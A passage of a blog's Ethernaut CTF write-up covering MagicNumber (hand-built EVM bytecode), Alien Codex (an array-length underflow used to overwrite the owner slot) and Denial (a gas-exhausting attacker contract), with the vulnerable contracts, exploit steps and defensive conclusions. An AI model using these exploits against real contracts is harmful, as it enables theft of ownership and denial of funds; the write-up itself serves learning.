+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kd">contract</span> <span class="nc">Test</span> <span class="p">{</span>
+<span class="ln"> 4</span>    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+<span class="ln"> 5</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln"> 6</span>            <span class="nf">mstore</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">)</span>
+<span class="ln"> 7</span>            <span class="nf">return</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
+<span class="ln"> 8</span>        <span class="p">}</span>
+<span class="ln"> 9</span>    <span class="p">}</span>
+<span class="ln">10</span><span class="p">}</span>
+</code></pre></div><p>This code is the equivalent of a <code>return 0x2A;</code> statement in Solidity. According to <a href="https://docs.soliditylang.org/en/latest/yul.html">Yul documentation</a> the <code>return(p, s)</code> instruction finishes the execution of the current function and returns to the caller the data values located in memory positions <code>p</code> to <code>p+s</code>. This requires the return value to be stored somewhere in memory, and that's where the <code>mstore(p, v)</code> instruction comes in, as it stores the value <code>v</code> to memory positions <code>p</code> to <code>p+32</code> (or <code>p+0x20</code>).</p>
+<p>The <code>Test</code> contract stores the <code>uint256</code> value <code>0x2A</code> to memory positions <code>0x80</code> to <code>0x100</code> (that is, 32 bytes), and then returns to caller the <code>0x20</code> bytes starting at <code>0x80</code>, exactly what was stored in the previous instruction. This is as close as I could get to EVM assembly from Remix, however this still needs some tweaking.</p>
+<p>Instead of implementing the <code>whatIsTheMeaningOfLife()</code> function, I coded the solution in <code>fallback()</code>. This allows the compiler to optimize out the function signature hash comparison, and react to any function called. The interesting part of the compiler output for this <code>Test</code> contract is shown below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="ln"> 1</span><span class="na">.data</span>
+<span class="ln"> 2</span>  <span class="err">0:</span>
+<span class="ln"> 3</span>    <span class="na">.code</span>
+<span class="ln"> 4</span>      <span class="nf">PUSH</span> <span class="mi">80</span>
+<span class="ln"> 5</span>      <span class="nf">PUSH</span> <span class="mi">40</span>
+<span class="ln"> 6</span>      <span class="nf">MSTORE</span> 
+<span class="ln"> 7</span>      <span class="no">PUSH</span> <span class="mi">2</span><span class="no">A</span>
+<span class="ln"> 8</span>      <span class="nf">PUSH</span> <span class="mi">80</span>
+<span class="ln"> 9</span>      <span class="nf">MSTORE</span> 	
+<span class="ln">10</span>      <span class="no">PUSH</span> <span class="mi">20</span>	
+<span class="ln">11</span>      <span class="no">PUSH</span> <span class="mi">80</span>
+<span class="ln">12</span>      <span class="nf">RETURN</span> 	
+<span class="ln">13</span>    <span class="no">.data</span>
+</code></pre></div><p>Lines 7 to 12 are the ones that solve the challenge. However, the <code>PUSH</code> instruction can be compiled to a family of instructions depending on the length (in bytes) of the argument. In this case, we need the arguments to be of 1 byte, so the corresponding instruction would be <code>PUSH1</code>. This is done to minimize the contract code length (otherwise we would need a longer constant for the memory address and value).</p>
+<p>Looking up the instructions at <a href="https://ethervm.io/">Ethereum Virtual Machine opcodes</a>, the ones needed for this challenge are:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Assembly instruction</th>
+<th style="text-align:center">EtherVM opcode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>PUSH1 xx</code></td>
+<td style="text-align:center"><code>0x60 xx</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>MSTORE</code></td>
+<td style="text-align:center"><code>0x52</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>RETURN</code></td>
+<td style="text-align:center"><code>0xF3</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>CODECOPY</code></td>
+<td style="text-align:center"><code>0x39</code></td>
+</tr>
+</tbody>
+</table>
+<p>So, the code for the solver contract should be:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="ln">1</span><span class="nf">PUSH1</span> <span class="mi">2</span><span class="no">A</span>
+<span class="ln">2</span><span class="nf">PUSH1</span> <span class="mi">80</span>
+<span class="ln">3</span><span class="nf">MSTORE</span> 	
+<span class="ln">4</span><span class="no">PUSH1</span> <span class="mi">20</span>	
+<span class="ln">5</span><span class="no">PUSH1</span> <span class="mi">80</span>
+<span class="ln">6</span><span class="nf">RETURN</span> 	
+</code></pre></div><p>And its opcodes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>60 2A
+<span class="ln">2</span>60 80
+<span class="ln">3</span>52
+<span class="ln">4</span>60 20
+<span class="ln">5</span>60 80
+<span class="ln">6</span>F3
+</code></pre></div><p>Great, now the contract fits in the required 10 bytes. However, this is impossible to deploy as-is.</p>
+<p>The code written so far is the <em>runtime code</em> of the contract. This doesn't include the code for a constructor (if there was one) or the <em>creation code</em> for the EVM. <a href="https://monokh.com/posts/ethereum-contract-creation-bytecode">This post by monokh</a> talks about the different bytecodes and explains the purpose and workings of the <em>initialization code</em>, an alias for the <em>creation code</em>. More detailed information can be found at <a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-5-the-smart-contract-creation-process-cb7b6133b855">this medium</a></p>
+<p>The goal of this <em>initialization code</em> is to return the contract code. Pretty much like the function coded above returns <code>42</code> as an integer, this code should return the <em>runtime code</em> of the to-be-constructed contract. The good part is that, since this initialization code will not be part of the deployed contract, we don't have a 10-byte size limit.</p>
+<p>The first step is to copy the runtime code, that comes as <code>calldata</code> on the deployment transaction, to memory. The <code>CODECOPY</code> instruction does exactly this, given 3 arguments in the stack:</p>
+<ul>
+<li><code>destOffset</code>, the memory address where the code will be copied</li>
+<li><code>offset</code>, the calldata position where the code to be copied starts</li>
+<li><code>length</code>, how many bytes of code are going to be copied</li>
+</ul>
+<p>Now that the runtime code is in memory, it has to be returned. This is the same code used above to return the constant <code>42</code>. The <code>RETURN</code> instruction with <code>offset</code> and <code>length</code> as parameters. These values will be the same as the previous <code>CALLCODE</code> instruction arguments.</p>
+<p>Let's mock the initialization code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>PUSH &lt;runtime code length&gt;
+<span class="ln">2</span>PUSH &lt;runtime code start&gt;
+<span class="ln">3</span>PUSH &lt;memory destination&gt;
+<span class="ln">4</span>CODECOPY
+<span class="ln">5</span>PUSH &lt;runtime code length&gt;
+<span class="ln">6</span>PUSH &lt;memory destination&gt;
+<span class="ln">7</span>RETURN
+</code></pre></div><p>The <code>&lt;runtime code length&gt;</code> is 10 (<code>0x0A</code>), as stated above. <code>&lt;memory destination&gt;</code> can be an arbitrary value, since there's no restriction on location, so I chose <code>0x00</code>. <code>&lt;runtime code start&gt;</code> must be calculated as the position where the runtime code starts in the <code>calldata</code> sent with the transaction. Since the runtime code will come after the initialization code, <code>&lt;runtime code start&gt;</code> will be the length of the initialization code, 12 or <code>0x0C</code> (positions start at 0).</p>
+<p>Replacing all the values and concatenating both codes, the complete solution for this level is then:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="ln"> 1</span><span class="nf">PUSH1</span> <span class="mi">0</span><span class="no">A</span>
+<span class="ln"> 2</span><span class="nf">PUSH1</span> <span class="mi">0</span><span class="no">C</span>
+<span class="ln"> 3</span><span class="nf">PUSH1</span> <span class="mi">00</span>
+<span class="ln"> 4</span><span class="nf">CODECOPY</span>
+<span class="ln"> 5</span><span class="nf">PUSH1</span> <span class="mi">0</span><span class="no">A</span>
+<span class="ln"> 6</span><span class="nf">PUSH1</span> <span class="mi">00</span>
+<span class="ln"> 7</span><span class="nf">RETURN</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="nf">PUSH1</span> <span class="mi">2</span><span class="no">A</span>
+<span class="ln">10</span><span class="nf">PUSH1</span> <span class="mi">80</span>
+<span class="ln">11</span><span class="nf">MSTORE</span> 	
+<span class="ln">12</span><span class="no">PUSH1</span> <span class="mi">20</span>	
+<span class="ln">13</span><span class="no">PUSH1</span> <span class="mi">80</span>
+<span class="ln">14</span><span class="nf">RETURN</span> 
+</code></pre></div><p>And so the whole bytecode is: <code>0x600A600C600039600A6000F3602A60805260206080F3</code>.</p>
+<p>To deploy it, I used a variation of the <code>Deployer</code> contract from CTE's <a href="../capturetheether-4/#fuzzy-identity">Fuzzy identity</a> challenge:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kd">contract</span> <span class="nc">Deployer</span> <span class="p">{</span>
+<span class="ln"> 4</span>    
+<span class="ln"> 5</span>    <span class="kd">function</span> <span class="nf">deployContract</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">salt</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln"> 6</span>        <span class="kt">uint176</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="mh">0x600A600C600039600A6000F3602A60805260206080F3</span><span class="p">;</span>
+<span class="ln"> 7</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">code</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">bytecode</span><span class="p">);</span>
+<span class="ln"> 8</span>        <span class="kt">address</span> <span class="n">addr</span><span class="p">;</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln">11</span>          <span class="n">addr</span> <span class="o">:=</span> <span class="n">create2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="n">salt</span><span class="p">)</span>
+<span class="ln">12</span>        <span class="p">}</span>
+<span class="ln">13</span>
+<span class="ln">14</span>        <span class="nf">return</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="err">;</span>
+<span class="ln">15</span>    <span class="p">}</span>
+<span class="ln">16</span>
+<span class="ln">17</span>    <span class="kd">function</span> <span class="nf">testDeployed</span><span class="p">(</span><span class="kt">address</span> <span class="n">solver</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">18</span>        <span class="p">(,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">solver</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+<span class="ln">19</span>
+<span class="ln">20</span>        <span class="c1">// This should return 42.
+</span><span class="ln">21</span><span class="c1"></span>        <span class="k">return</span> <span class="kt">uint256</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">(</span><span class="n">result</span><span class="p">));</span>
+<span class="ln">22</span>    <span class="p">}</span>
+<span class="ln">23</span>
+<span class="ln">24</span><span class="p">}</span>
+</code></pre></div><p>The <code>deployContract(bytes32)</code> deploys the solver and returns the address. The <code>testDeployed(address)</code> calls the fallback function of <code>solver</code> to check its correct return value.</p>
+<h3 id="conclusions-2">Conclusions</h3>
+<p>An amazing challenge whose goal is for the user to know the details of contract creation process, EVM assembly instructions and low level calls. There are many great resources online to learn from.</p>
+<hr>
+<h2 id="level-19-alien-codex">Level 19: Alien Codex</h2>
+<hr>
+<p>An Alien contract that expects the player to become the new owner. This time with a little twist.</p>
+<h3 id="contract-analysis-3">Contract analysis</h3>
+<p>The contract is quite simple. It implements a <code>bytes32[] codex</code> array that is used as data storage, and a <code>bool contact</code> flag that indicates if the player <em>made contact</em> with the contract.</p>
+<p>Two interesting facts come to light upon inspection: the contract was meant to be compiled with Solidity 0.5, and it inherits from <code>Ownable</code>. The old version of the compiler can be a telltale sign of integer overflows, because it doesn't use <code>SafeMath</code> library. The <code>Ownable</code> contract is an <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol">OpenZeppelin</a> implementation of a simple access control, defining an <code>owner</code> address and a modifier to allow certain functions to be executed only by the owner.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#39;../helpers/Ownable-05.sol&#39;</span><span class="p">;</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span><span class="kd">contract</span> <span class="nc">AlienCodex</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>  <span class="kt">bool</span> <span class="k">public</span> <span class="n">contact</span><span class="p">;</span>
+<span class="ln"> 9</span>  <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">public</span> <span class="n">codex</span><span class="p">;</span>
+<span class="ln">10</span>
+<span class="ln">11</span>  <span class="kd">modifier</span> <span class="nf">contacted</span><span class="p">()</span> <span class="p">{</span>
+<span class="ln">12</span>    <span class="nb">assert</span><span class="p">(</span><span class="n">contact</span><span class="p">);</span>
+<span class="ln">13</span>    <span class="k">_</span><span class="p">;</span>
+<span class="ln">14</span>  <span class="p">}</span>
+<span class="ln">15</span>  
+<span class="ln">16</span>  <span class="kd">function</span> <span class="nf">make_contact</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">17</span>    <span class="n">contact</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">18</span>  <span class="p">}</span>
+<span class="ln">19</span>
+<span class="ln">20</span>  <span class="kd">function</span> <span class="nf">record</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">21</span>  	<span class="n">codex</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">_content</span><span class="p">);</span>
+<span class="ln">22</span>  <span class="p">}</span>
+<span class="ln">23</span>
+<span class="ln">24</span>  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">25</span>    <span class="n">codex</span><span class="p">.</span><span class="n">length</span><span class="o">--</span><span class="p">;</span>
+<span class="ln">26</span>  <span class="p">}</span>
+<span class="ln">27</span>
+<span class="ln">28</span>  <span class="kd">function</span> <span class="nf">revise</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">29</span>    <span class="n">codex</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">_content</span><span class="p">;</span>
+<span class="ln">30</span>  <span class="p">}</span>
+<span class="ln">31</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-3">Vulnerability / Attack vector</h3>
+<p>Integer overflow at line 25 of <code>AlienCodex</code>, combined with a full storage access as consequence.</p>
+<h3 id="solution-3">Solution</h3>
+<p>Let's check the contract storage layout:</p>
+<ul>
+<li>Slot 0: <code>address owner</code>, inherited, and <code>bool contact</code>, as stated by Solidity storage packing rules.</li>
+<li>Slot 1: <code>codex.length</code></li>
+<li>Slot <code>keccak256(1)</code>: <code>codex[0]</code></li>
+<li>Slot <code>keccak256(1)</code> + 1: <code>codex[1]</code>, and so on.</li>
+</ul>
+<p>The <code>retract()</code> function does not check for overflow, so it can make <code>codex.length</code> overflow. This gives full read and write storage access to any slot, because every slot is part of the array now. So, the <code>revise(uint, bytes32)</code> function will allow the attacker to overwrite any storage slot with any value.</p>
+<p>However, to execute <code>retract()</code>, the <code>bool contact</code> flag must be set to true. This is done by calling <code>make_contact()</code> in the first place.</p>
+<p>The full procedure to exploit this contract is, then:</p>
+<ul>
+<li>Call <code>make_contact()</code>, to set the <code>contact</code> flag.</li>
+<li>Call <code>retract()</code> to overflow <code>codex.length</code>.</li>
+<li>Call <code>revise(uint, bytes32)</code> to overwrite the <code>owner</code> address at slot 0.</li>
+</ul>
+<p>The last call <code>bytes32</code> argument should be the player's address converted to <code>byte32</code> (that is, padded with zeros). The <code>uint</code> argument, on the other hand, is used as index to the <code>codex</code> array, so it should be calculated to overwrite storage slot 0.</p>
+<p>Element <code>n</code> of the <code>codex</code> array is mapped to storage slot <code>keccak256(1) + n</code>. The <code>1</code> comes from the fact that the <code>codex.length</code> variable is at slot <code>1</code>. So, to overwrite storage slot 0, the correct index to be accessed should be calculated to satisfy <code>keccak256(1) + k = 0</code>, or according to integer overflow rules, <code>keccak256(1) + k = 2**256</code>. Therefore, <code>k = 2**256 - keccak256(1)</code>.</p>
+<h3 id="conclusions-3">Conclusions</h3>
+<p>Overflowing an array length value is a dangerous thing to happen, since it can give full access to every storage slot of the contract. This can be particularly devastating in contracts that keep accounting of token balances, or monetary values stored.</p>
+<p>Keep an eye out for integer overflows, either by using <code>SafeMath</code> library, or a Solidity version higher than 0.8.</p>
+<hr>
+<h2 id="level-20-denial">Level 20: Denial</h2>
+<hr>
+<p>A wallet contract that allows the withdrawing partner and the contract owner to receive 1% of the balance everytime a function is called. The goal is to deny the owner to receive funds.</p>
+<h3 id="contract-analysis-4">Contract analysis</h3>
+<p>This contract implements some helper functions, such as <code>setWithdrawPartner(address)</code> that changes the current partner, and <code>contractBalance()</code> that returns the current balance of the contract.</p>
+<p>The <code>withdraw()</code> function implements the value transfer from the contract to the partner and the owner. The first transfer is done via a <code>call</code> to the fallback function, and the second via a <code>transfer()</code>.</p>
+<p>There's some logic after sending the amounts, but it's not relevant to the implementation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span><span class="kd">contract</span> <span class="nc">Denial</span> <span class="p">{</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>    <span class="kn">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+<span class="ln"> 9</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw
+</span><span class="ln">10</span><span class="c1"></span>    <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
+<span class="ln">11</span>    <span class="kt">uint</span> <span class="n">timeLastWithdrawn</span><span class="p">;</span>
+<span class="ln">12</span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances
+</span><span class="ln">13</span><span class="c1"></span>
+<span class="ln">14</span>    <span class="kd">function</span> <span class="nf">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_partner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">15</span>        <span class="n">partner</span> <span class="o">=</span> <span class="n">_partner</span><span class="p">;</span>
+<span class="ln">16</span>    <span class="p">}</span>
+<span class="ln">17</span>
+<span class="ln">18</span>    <span class="c1">// withdraw 1% to recipient and 1% to owner
+</span><span class="ln">19</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">20</span>        <span class="kt">uint</span> <span class="n">amountToSend</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">.</span><span class="n">div</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+<span class="ln">21</span>        <span class="c1">// perform a call without checking return
+</span><span class="ln">22</span><span class="c1"></span>        <span class="c1">// The recipient can revert, the owner will still get their share
+</span><span class="ln">23</span><span class="c1"></span>        <span class="n">partner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="n">amountToSend</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+<span class="ln">24</span>        <span class="n">owner</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
+<span class="ln">25</span>        <span class="c1">// keep track of last withdrawal time
+</span><span class="ln">26</span><span class="c1"></span>        <span class="n">timeLastWithdrawn</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
+<span class="ln">27</span>        <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">]</span> <span class="o">=</span> <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">].</span><span class="n">add</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
+<span class="ln">28</span>    <span class="p">}</span>
+<span class="ln">29</span>
+<span class="ln">30</span>    <span class="c1">// allow deposit of funds
+</span><span class="ln">31</span><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+<span class="ln">32</span>
+<span class="ln">33</span>    <span class="c1">// convenience function
+</span><span class="ln">34</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">contractBalance</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">35</span>        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+<span class="ln">36</span>    <span class="p">}</span>
+<span class="ln">37</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-4">Vulnerability / Attack vector</h3>
+<p>The contract doesn't check the return value for the external call to the partner's address. This allows the call to fail and not affect the rest of the execution, however, if this call consumes up all the gas, the transaction would fail anyway.</p>
+<h3 id="solution-4">Solution</h3>
+<p>An external call to a function can't really use up all the gas of the transaction. According to <a href="https://eips.ethereum.org/EIPS/eip-150">EIP-150</a>, the call can use at most 63/64ths of the gas available. This makes an interesting bug: if the remaining 1/64th of the gas is enough to finish executing the caller's function, it will succeed, else it will fail. This is effectively a bug that can be hard to spot.</p>
+<p>Now, let's talk about the solution. The attacker contract below uses an <code>assert</code> instruction with a false argument, so when it is called, it consumes all remaining gas (well, <em>almost</em>, 63/64ths of the forwarded gas, as stated above).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln">1</span><span class="kd">contract</span> <span class="nc">DenialAttack</span> <span class="p">{</span>
+<span class="ln">2</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+<span class="ln">3</span>        <span class="nb">assert</span><span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">);</span>
+<span class="ln">4</span>    <span class="p">}</span>
+<span class="ln">5</span><span class="p">}</span>
+</code></pre></div><p>Setting an instance of <code>DenialAttack</code> as the withdrawing partner will cause the transaction to fail.</p>
+<h3 id="conclusions-4">Conclusions</h3>
+<p>External calls should have a fixed gas limit, enforced by the caller: <code>partner.call{value: amountToSend, gas: 1000000}(&quot;&quot;)</code>. This ensures the caller will have enough gas to finish its execution safely.</p>
+    </div>
+
+	<h2 class="post_related">Posts in this Series</h2>
+	<ul>
+	  
+	</ul>
+
+<div class="post_comments">
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "tqts" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  
+</div>
+
+
+
+  </article>
+<aside class="sidebar">
+  <section class="sidebar_inner">
+        <h2>tqts</h2>
+      <div class="author_bio">
+        Engineer, maker, hobbyist.
+      </div>
+      <a href='https://tqts.ar/about/' class="button mt-1" role="button" title='Read More'>Read More</a>
+    
+      
+	    <h2 class="mt-4">Posts in this series</h2>
+      <ul>
+        
+      </ul>
+    
+    <h2 class="mt-4">Recent Posts</h2>
+    <ul class="flex-column">
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-3/" class="nav-link" title="Solving Ethernaut - Part 3 - Levels 11 to 15">Solving Ethernaut - Part 3 - Levels 11 to 15</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-2/" class="nav-link" title="Solving Ethernaut - Part 2 - Levels 6 to 10">Solving Ethernaut - Part 2 - Levels 6 to 10</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/ethernaut-1/" class="nav-link" title="Solving Ethernaut - Part 1 - Levels 0 to 5">Solving Ethernaut - Part 1 - Levels 0 to 5</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-5/" class="nav-link" title="Solving CaptureTheEther - Part 5 of 5 - Miscellaneous">Solving CaptureTheEther - Part 5 of 5 - Miscellaneous</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-4/" class="nav-link" title="Solving CaptureTheEther - Part 4 of 5 - Accounts">Solving CaptureTheEther - Part 4 of 5 - Accounts</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-3/" class="nav-link" title="Solving CaptureTheEther - Part 3 of 5 - Math">Solving CaptureTheEther - Part 3 of 5 - Math</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-2/" class="nav-link" title="Solving CaptureTheEther - Part 2 of 5 - Lotteries">Solving CaptureTheEther - Part 2 of 5 - Lotteries</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-1/" class="nav-link" title="Solving CaptureTheEther - Part 1 of 5 - Warmup">Solving CaptureTheEther - Part 1 of 5 - Warmup</a>
+      </li>
+    </ul>
+    <div>
+      <h2 class="mt-4 taxonomy" id="categories-section">Categories</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/categories/ctf-writeups/' class="post_tag button button_translucent" title="ctf-writeups">
+          CTF-WRITEUPS
+          <span class="button_tally">9</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="series-section">Series</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/series/capturetheether/' class="post_tag button button_translucent" title="capturetheether">
+          CAPTURETHEETHER
+          <span class="button_tally">5</span>
+        </a>
+        
+        <a href='https://tqts.ar/series/ethernaut/' class="post_tag button button_translucent" title="ethernaut">
+          ETHERNAUT
+          <span class="button_tally">4</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="tags-section">Tags</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/tags/remix/' class="post_tag button button_translucent" title="remix">
+          REMIX
+          <span class="button_tally">9</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/solidity/' class="post_tag button button_translucent" title="solidity">
+          SOLIDITY
+          <span class="button_tally">8</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/python/' class="post_tag button button_translucent" title="python">
+          PYTHON
+          <span class="button_tally">2</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+  </section>
+</aside>
+
+  
+</div>
+    </main><svg width="0" height="0" class="hidden">
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"></path>
+  </symbol>
